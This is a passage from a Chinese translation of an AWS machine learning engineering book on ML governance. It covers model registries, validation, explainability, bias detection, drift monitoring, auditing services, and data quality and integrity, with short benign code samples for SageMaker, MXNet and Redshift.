除了 SageMaker 执行的自动实验和血缘跟踪外，重要的是要注意我们还可以通过编程方式手动创建关联。我们还可以使用**boto3**和**SageMaker Search** API 来获取有关训练 ML 模型的详细信息。在大多数情况下，我们可以使用 SageMaker 控制台，以及可用的搜索功能。

如果你正在使用深度学习框架在 AWS 计算服务（如 EC2、ECS 或 Lambda）上运行训练脚本，你可以使用如**ML Metadata**（用于 TensorFlow）的库来跟踪血缘，以及机器学习管道中不同组件的工件。

注意

更多关于**ML Metadata**的信息，请查看[`www.tensorflow.org/tfx/tutorials/mlmd/mlmd_tutorial`](https://www.tensorflow.org/tfx/tutorials/mlmd/mlmd_tutorial)。

## 模型库存

管理模型库存对于建立机器学习治理至关重要。能够维护一个有序的模型库存，使得数据科学团队的关键成员能够立即了解模型的当前状态和性能。

在 AWS 的机器学习环境中管理模型库存有不同方式。我们可以采取的一种可能的方法是使用各种服务构建一个定制解决方案！例如，我们可以从头开始设计和构建一个**无服务器**的模型注册表，使用**Amazon DynamoDB**、**Amazon S3**、**Amazon ECR**、**Amazon API Gateway**和**AWS Lambda**，如下面的图所示：

![图 9.6 – 定制构建的模型注册表](img/B18638_09_006.jpg)

图 9.6 – 定制构建的模型注册表

在这个定制解决方案中，我们准备以下 Lambda 函数：

+   **上传模型包**：用于上传模型包（包括 ML 模型工件、训练和推理脚本、脚本将运行的环境的容器镜像以及模型元数据）

+   `PENDING`、`APPROVED`或`REJECTED`状态，以及模型包不同组件存储的标识符和路径

+   `PENDING`、`APPROVED`或`REJECTED`

如果需要扩展此自定义模型注册表的函数，我们可以轻松地添加更多 Lambda 函数。这个选项将给我们带来最大的灵活性，但需要花费几天时间来设置整个系统。

另一种选择是使用现有的一个，例如**MLFlow 模型注册表**，并在 EC2 实例或 ECS 容器中部署它。最后，我们可以使用**SageMaker 模型注册表**，它已经具有我们需要的模型库存管理功能，例如模型批准和模型生命周期跟踪。

注意

如需了解更多信息和如何使用 SageMaker 模型注册表的详细信息，请随时查看*第八章*，*模型监控和管理解决方案*。

## 模型验证

在 ML 模型训练完成后，需要对其进行评估，以检查其性能是否允许实现某些业务目标。数据科学团队还需要验证模型的选择，因为简单模型可能容易**欠拟合**，而复杂模型则容易**过拟合**。同时，需要审查用于模型验证的指标，因为某些指标表示模型性能的能力取决于所解决问题的上下文。例如，对于欺诈检测用例，**平衡 F 分数**可能是一个更有意义的选项，比**准确率**更有意义（因为由于类别不平衡，模型准确率分数仍然可能很高）。

注意

如需了解更多关于平衡 F 分数的信息，请随时查看[`en.wikipedia.org/wiki/F-score`](https://en.wikipedia.org/wiki/F-score)。

评估模型的第一种方式是通过**离线测试**，使用历史数据来评估训练好的模型。这可以通过使用“保留集”进行**验证**来完成，这些数据未用于模型训练。另一种选择是使用**k 折交叉验证**，这是一种流行的检测过拟合的技术。当使用 SageMaker 时，可以通过多种方式执行离线测试：

+   在 SageMaker 训练作业完成后生成的模型文件（存储在`model.tar.gz`文件中）可以通过适当的库或框架加载和评估，而无需 SageMaker 推理端点的存在。例如，使用 SageMaker 训练的**线性学习器**模型可以使用**MXNet**（例如，在容器中运行的定制应用程序内）加载，如下面的代码块所示：

    ```py
    def load_model():
    ```

    ```py
        sym_json = json_load(open('mx-mod-symbol.json')) 
    ```

    ```py
        sym_json_string = json_dumps(sym_json)
    ```

    ```py
        model = gluon.nn.SymbolBlock( 
    ```

    ```py
            outputs=mxnet.sym.load_json(sym_json_string), 
    ```

    ```py
            inputs=mxnet.sym.var('data'))
    ```

    ```py
        model.load_parameters(
    ```

    ```py
            'mx-mod-0000.params', 
    ```

    ```py
            allow_missing=True
    ```

    ```py
        )
    ```

    ```py
        model.initialize()
    ```

    ```py
        return model
    ```

一旦模型经过评估，就可以部署到推理端点。

+   另一种选择是将模型部署到“alpha”机器学习推理端点，并使用历史数据对其进行评估。一旦评估步骤完成，可以将模型部署到“生产”机器学习推理端点，并删除“alpha”端点。

另一种方法涉及**在线测试**，使用实时数据来评估模型。可以使用 SageMaker 通过其 A/B 测试支持进行在线测试，其中可以在一个推理端点下部署两个或多个模型。采用这种方法，可以将一小部分流量路由到正在验证的模型变体，持续一定时期。一旦验证步骤完成，可以将 100%的流量路由到其中一个变体。

注意

查看以下笔记本，了解如何使用 SageMaker 设置多个模型的 A/B 测试示例：[`bit.ly/3uSRZSE`](https://bit.ly/3uSRZSE)。

既然我们已经讨论了模型评估，让我们进一步探讨机器学习可解释性。

## 机器学习可解释性

在某些情况下，由于机器学习可解释性的问题，企业主和利益相关者拒绝使用某些类型的模型。有时，由于机器学习模型的复杂性，很难从概念上解释它是如何工作的，或者它是如何产生预测或推理结果的。一旦利益相关者对机器学习模型如何产生输出有更多的可见性和理解，他们更有可能批准使用某些模型。这涉及到理解每个特征对模型预测输出值的贡献程度。

注意

注意，机器学习从业者经常将**模型可解释性**和**模型可解释性**互换使用。然而，这两个术语是不同的，应该谨慎使用。可解释性关注的是机器学习模型的工作方式——即它是如何内部工作的。另一方面，可解释性关注的是机器学习模型的行为，包括输入特征值如何影响预测输出值。有关此主题的更多信息，请随时查看[`docs.aws.amazon.com/whitepapers/latest/model-explainability-aws-ai-ml/interpretability-versus-explainability.xhtml`](https://docs.aws.amazon.com/whitepapers/latest/model-explainability-aws-ai-ml/interpretability-versus-explainability.xhtml)。

机器学习可解释性可以通过**全局可解释性**和**局部可解释性**来处理。如果我们能够识别出每个特征对模型预测的贡献程度，那么我们就实现了全局可解释性。另一方面，如果我们能够识别出每个特征对单个记录（或数据点）的预测的贡献程度，那么我们就可以实现局部可解释性。

注意

想了解更多关于机器学习可解释性的信息，请查看[`docs.aws.amazon.com/sagemaker/latest/dg/clarify-model-explainability.xhtml`](https://docs.aws.amazon.com/sagemaker/latest/dg/clarify-model-explainability.xhtml)。

在生成机器学习可解释性报告时，以下是一些可能的解决方案：

+   使用开源库（例如，`shap`库）并在**AWS Lambda**函数或**Amazon ECS**容器中部署自定义解决方案。

+   使用**SageMaker Clarify**运行一个作业并生成可解释性报告：

    ```py
    processor = SageMakerClarifyProcessor(...)
    ```

    ```py
    processor.run_explainability(...)
    ```

+   使用开源库（例如，`shap`库）并使用**SageMaker Processing**运行自定义代码，同时使用自定义容器镜像。

既然我们已经讨论了机器学习可解释性，让我们来看看如何在 AWS 上使用各种解决方案来执行机器学习偏差检测。

## 偏差检测

检测机器学习偏差对于任何机器学习项目的成功至关重要。如果机器学习偏差没有被检测和缓解，利用机器学习模型的自动化系统可能会得出不公平的预测。例如，基于机器学习的招聘应用程序可能会对某些群体（例如，女性候选人）做出不公平的候选人选择。另一个例子是自动贷款申请可能会拒绝来自代表性不足的群体的贷款申请（例如，居住在特定国家的群体）。

机器学习偏差可以使用各种指标来衡量。以下是一些可以用来衡量机器学习偏差的指标：

+   **类别不平衡**：这衡量和检测不同组之间成员数量的任何不平衡。

+   **标签不平衡**：这衡量和检测不同组之间正结果之间的任何不平衡。

+   **Kullback-Leibler (KL) 散度**：这比较和衡量不同组的结果分布之间的差异。

+   **Jensen-Shannon (JS) 散度**：与 KL 散度类似，JS 散度比较和衡量不同组的结果分布之间的差异。

注意

如果你想了解更多关于衡量机器学习偏差的不同指标，请查看[`docs.aws.amazon.com/sagemaker/latest/dg/clarify-measure-data-bias.xhtml`](https://docs.aws.amazon.com/sagemaker/latest/dg/clarify-measure-data-bias.xhtml)。

当使用 AWS 服务和功能来检测机器学习偏差时，以下是一些可能的解决方案：

+   使用开源库（例如，`ResponsiblyAI/responsibly`）并在**AWS Lambda**函数或**Amazon ECS**容器中部署自定义解决方案。

+   使用**SageMaker Clarify**运行一个作业并生成预训练和后训练偏差报告：

    ```py
    processor = SageMakerClarifyProcessor(...)
    ```

    ```py
    processor.run_bias(...)
    ```

+   使用开源库（例如，`ResponsiblyAI/responsibly`库）并使用**SageMaker Processing**运行自定义代码，同时使用自定义容器镜像。

+   使用**SageMaker Model Monitor**与**SageMaker Clarify**一起监控推理端点中部署的模型中的偏差漂移。

在检测到机器学习偏差后，下一步是通过各种手段（根据上下文和机器学习偏差的类型）解决和缓解问题。本书不会讨论不同的偏差缓解策略，因此请随意查看 https://sagemaker-examples.readthedocs.io/en/latest/end_to_end/fraud_detection/3-mitigate-bias-train-model2-registry-e2e.xhtml#Develop-an-Unbiased-Model 以获取一个快速端到端示例。

## 模型监控

在*第八章*，*模型监控与管理解决方案*中，我们实现了在机器学习推理端点上的数据捕获，并随后设置了计划监控，该监控能够从捕获的数据中检测违规和数据质量问题。这种设置将帮助我们尽早发现任何不一致性，以便立即采取纠正措施。*如果这些问题和不一致性得不到纠正，会发生什么？* 如果不立即采取纠正措施，部署的模型可能会经历性能衰减或退化，直到“修复”被应用。当然，在应用任何纠正措施之前，我们首先需要检测这些不一致性。也就是说，我们的下一个问题将是，*我们如何检测这些不一致性和问题？*

![图 9.7 – 检测漂移](img/B18638_09_007.jpg)

图 9.7 – 检测漂移

在前面的图中，我们可以看到，通过在基线数据集和捕获的机器学习推理数据（通过机器学习推理端点）上执行所需的分析（例如，数据质量检查），我们可以检测到“漂移”。一旦完成所需的分析，基线数据集和捕获的机器学习推理数据的分析结果将被比较，以查看结果差异是否超过某个阈值。

注意，我们可以使用 **SageMaker 模型监控器** 检测以下问题：

+   **数据质量漂移**：这是通过比较以下内容来检测的：

    +   **[“属性” – A]**：用于训练部署模型的基线数据集的统计性质和属性（例如，数据类型）

    +   **[“属性” – B]**：捕获的机器学习推理数据的属性

+   **模型性能漂移**：这是通过比较以下内容来检测的：

    +   **[“属性” – A]**：模型在基线数据集上的性能

    +   **[“属性” – B]**：模型在捕获的机器学习推理数据上的性能（与上传的地面实况标签合并）

+   **模型偏差漂移**：这是通过比较以下内容来检测的：

    +   **[“属性” – A]**：模型在基线数据集上的偏差度量

    +   **[“属性” – B]**：捕获的机器学习推理数据上的偏差度量

+   **特征归因漂移**：这是通过比较以下内容来检测的：

    +   **[“属性” – A]**：基线数据集的特征分布值

    +   **[“属性” – B]**：捕获的机器学习推理数据的特征分布值

注意

为了更容易理解这些概念，让我们讨论一个简单的例子，看看如何处理`年龄`和`薪水`。然后，我们使用这个训练数据集作为 SageMaker 模型监控器的基线。在分析数据集后，SageMaker 模型监控器返回了一组建议的约束，要求年龄和薪水的值始终为正。随后，我们将 ML 模型部署到配置为收集包含输入和输出值（即年龄输入和预测的薪水值）的请求和响应数据的 SageMaker 推理端点。然后，我们配置了一个 SageMaker 模型监控器“计划”，该计划触发一个处理作业。这个作业分析收集到的请求和响应数据，并检查是否违反了配置的约束。如果收集到的数据中包含年龄输入值的负值，SageMaker 模型监控器应该能够检测到这一点，并在计划的处理作业完成后标记此违规行为。

一旦分析完检测到的不一致性和问题，数据科学团队可能会根据问题执行以下一个或多个修复或更正操作：

+   修复向机器学习推理端点发送“不良数据”的系统中的问题。

+   用新的模型替换已部署的模型。

+   修复模型训练和部署管道中的现有问题。

现在，让我们来看看可追溯性、可观察性和审计。

## 可追溯性、可观察性和审计

我们必须能够审计和检查机器学习实验或部署的每一步中发生的一切，无论这些步骤是手动执行还是自动执行。这使我们能够轻松地识别和修复问题，使系统回到期望的配置状态。如果一个 ML 系统处于“不稳定”状态，ML 工程师必须能够使用正确的工具集快速进行故障排除和修复问题。

假设你的团队已经开始使用一个自动化的机器学习管道，该管道接受数据集作为输入，并在经过管道中的所有步骤后生成一个二进制分类机器学习模型作为输出。在几周的时间里，机器学习管道运行得很好...直到团队决定在管道的中间某个位置引入额外的数据处理步骤。团队注意到，由管道生成的多数二进制分类模型*总是*返回`0`，无论输入值是什么！在管道更改实施之前，所有生成的模型都返回了*0s*和*1s*（这是预期的）。作为机器学习工程师，你决定深入调查发生了什么...结果发现机器学习管道步骤没有生成日志，这使得故障排除变得更加困难。同时，你发现没有跟踪机制可以帮团队“连接点”并分析为什么生成的模型总是为分类结果生成`0`。在意识到需要几周时间来排查和修复现有问题后，你的团队决定停止使用自动化的机器学习管道（该管道花费了几个月的时间构建和打磨），并将其丢弃。*哎呀!* 如果有跟踪和审计机制，自动化的机器学习管道可以更快地恢复到稳定状态。

注意

不要让这种情况发生在你和你的团队身上！在构建机器学习管道时使用正确的工具集至关重要。有关机器学习管道的更多信息，请随时查看*第十章*，*在 Amazon EKS 上使用 Kubeflow 的机器学习管道*，以及*第十一章*，*使用 SageMaker Pipelines 的机器学习管道*。

作为机器学习工程师，你需要了解这些类型需求可用的“工具”。在 AWS 中对机器学习环境和系统执行审计工作时，我们可以使用以下服务和功能：

+   **AWS CloudTrail**：这可以用于捕获和记录 AWS 账户中的任何配置更改。

+   **AWS CloudTrail Lake**：这是一个用于 CloudTrail 数据分析的托管数据湖。

+   **Amazon CloudWatch 日志**：这包含来自各种服务（如 SageMaker、EC2 和 Redshift）的活动日志。

+   **Amazon Athena CloudWatch 连接器**：这使您可以使用 SQL 语句在 Amazon Athena 中查询 CloudWatch 日志数据。

+   **SageMaker Model Registry**：这可以用于跟踪模型部署的批准。

+   **SageMaker Experiments** 和 **SageMaker Lineage**：这些可以用于在 SageMaker 中完成实验后审计和跟踪模型血缘。

+   **AWS Audit Manager**：这可以用于简化并加快 AWS 账户的审计过程。

+   **AWS X-Ray**：这可以用于追踪整个应用程序中的请求，并排查分布式应用程序中的性能瓶颈。

我们不会深入探讨这些服务如何使用，因此请随意查看本章末尾的*进一步阅读*部分以获取更多详细信息。

## 数据质量分析和报告

能够尽早检测数据质量问题将帮助我们管理与之相关的任何风险。同时，我们能够在 ML 系统的实现、设置或架构上进行任何必要的短期和长期修正。在本节中，我们将讨论我们可以使用的某些可能的解决方案，以分析用于训练和推理的数据质量。

第一个解决方案涉及使用自定义代码和开源包来准备和生成数据质量报告。在*第一章* *AWS 机器学习工程简介*中，我们使用了一个名为`pandas_profiling`的 Python 库来自动分析我们的数据并生成分析报告。请注意，还有类似的库和包可供我们使用。当然，采用这种方法，我们将不得不自行管理基础设施方面。如果我们想升级这个设置，我们可以选择在**AWS Lambda**或使用**Amazon ECS**容器化应用程序中部署我们的自定义数据分析脚本。

另一个实用的选择是避免自己构建定制解决方案，而简单地使用现有的服务，这样我们可以专注于我们的目标和责任。在*第五章* *实用数据处理和分析*中，我们使用了**AWS Glue DataBrew**来加载数据、分析数据和处理数据。在运行分析作业后，我们能够访问额外的分析和信息，包括缺失单元格值、数据分布统计和重复行。

注意

数据质量问题也可能在推理过程中出现。一旦我们将机器学习模型部署到推理端点，该模型可以对包含缺失值和数据质量问题的请求数据进行预测。在*第八章* *模型监控和管理解决方案*中，我们启用了数据捕获并自动化了检测通过我们的 SageMaker 实时推理端点传输的数据质量违规的过程。我们安排了一个模型监控处理作业，该作业将处理数据并生成包含不同相关违规统计信息的自动报告（大约每小时一次）。

## 数据完整性管理

维护和管理数据完整性并非易事。检测和修复数据质量问题，如缺失值和重复行，只是挑战的第一步。管理数据完整性问题是下一个挑战，因为我们需要进一步确保数据库中存储的数据是完整、准确和一致的。

在*第四章* *AWS 上的无服务器数据管理*中，我们将一个合成数据集加载到数据仓库（使用 Redshift Serverless）和加载到数据湖（使用 Amazon Athena、Amazon S3 和 AWS Glue）。当我们对这个数据集执行一些样本查询时，我们只是假设没有需要担心数据质量和数据完整性问题。为了刷新我们的记忆，我们的数据集包含大约 21 列，其中包括一些“派生”列。一个“派生”列的好例子是`has_booking_changes`列。如果`booking_changes`列的值大于`0`，则`has_booking_changes`列的值预期为`True`。否则，`has_booking_changes`的值应该是`False`。为了识别`booking_changes`列值与`has_booking_changes`列值不匹配的记录，我们在我们的无服务器数据仓库（Redshift Serverless）中执行了以下查询：

```py
SELECT booking_changes, has_booking_changes, * 
FROM dev.public.bookings 
WHERE 
(booking_changes=0 AND has_booking_changes='True') 
OR 
(booking_changes>0 AND has_booking_changes='False');
```

这里有一些修复方法：

+   如果只有少数记录受到影响（相对于记录总数），那么我们可能（软删除）受影响的记录，并将这些记录排除在数据处理工作流程的未来步骤之外。请注意，这应该谨慎进行，因为排除记录可能会显著影响数据分析结果和机器学习模型性能（如果数据集用于训练机器学习模型）。

+   我们可以执行一个`UPDATE`语句来纠正`booking_changes`列的值。

注意，另一个可能的长期解决方案是在将数据加载到数据仓库或数据湖之前执行所需的数据完整性检查和修正。这意味着数据仓库或数据湖中的数据预期在初始数据加载时已经是“干净的”，我们可以安全地在这些集中式数据存储中执行查询和其他操作。

注意

除了这些，还需要审查与数据交互的应用和系统。请注意，即使我们清理了数据，由于根本原因尚未解决，连接的应用程序可能会引入一组新的数据完整性问题。

*就是这样！* 到目前为止，我们在建立机器学习治理时应该有更广泛的选项来解决各种问题和挑战。请随意再次阅读本章，以帮助您更深入地理解不同的概念和技术。

# 摘要

在本章中，我们讨论了各种策略和解决方案来管理机器学习环境和系统的整体安全性、合规性和治理。我们首先通过几个最佳实践来提高机器学习环境的安全性。之后，我们讨论了有关如何保护数据隐私和模型隐私的相关技术。在本章的末尾，我们介绍了使用各种 AWS 服务建立机器学习治理的不同解决方案。

在下一章中，我们将快速介绍**MLOps 管道**，然后深入探讨在 AWS 中使用**Kubeflow 管道**自动化 ML 工作流程。

# 进一步阅读

如需了解更多关于本章所涉及主题的信息，请随意查阅以下资源：

+   *AWS IAM 最佳实践* ([`aws.amazon.com/iam/resources/best-practices/`](https://aws.amazon.com/iam/resources/best-practices/))

+   *您的 VPC 安全最佳实践* ([`docs.aws.amazon.com/vpc/latest/userguide/vpc-security-best-practices.xhtml`](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-best-practices.xhtml))

+   *AWS PrivateLink 概念* ([`docs.aws.amazon.com/vpc/latest/privatelink/concepts.xhtml`](https://docs.aws.amazon.com/vpc/latest/privatelink/concepts.xhtml))

+   *AWS 审计管理器概念* ([`docs.aws.amazon.com/audit-manager/latest/userguide/concepts.xhtml`](https://docs.aws.amazon.com/audit-manager/latest/userguide/concepts.xhtml))

+   *AWS 合规中心* ([`aws.amazon.com/financial-services/security-compliance/compliance-center/`](https://aws.amazon.com/financial-services/security-compliance/compliance-center/))

+   *在 AWS Artifact 中下载报告* ([`docs.aws.amazon.com/artifact/latest/ug/downloading-documents.xhtml`](https://docs.aws.amazon.com/artifact/latest/ug/downloading-documents.xhtml))

# 第五部分：设计和构建端到端 MLOps 管道

在本节中，读者将学习如何使用各种服务和解决方案设计和构建 MLOps 管道。

本节包括以下章节：

+   *第十章*, *在 Amazon EKS 上使用 Kubeflow 的机器学习管道*

+   *第十一章*, *使用 SageMaker 管道的机器学习管道*
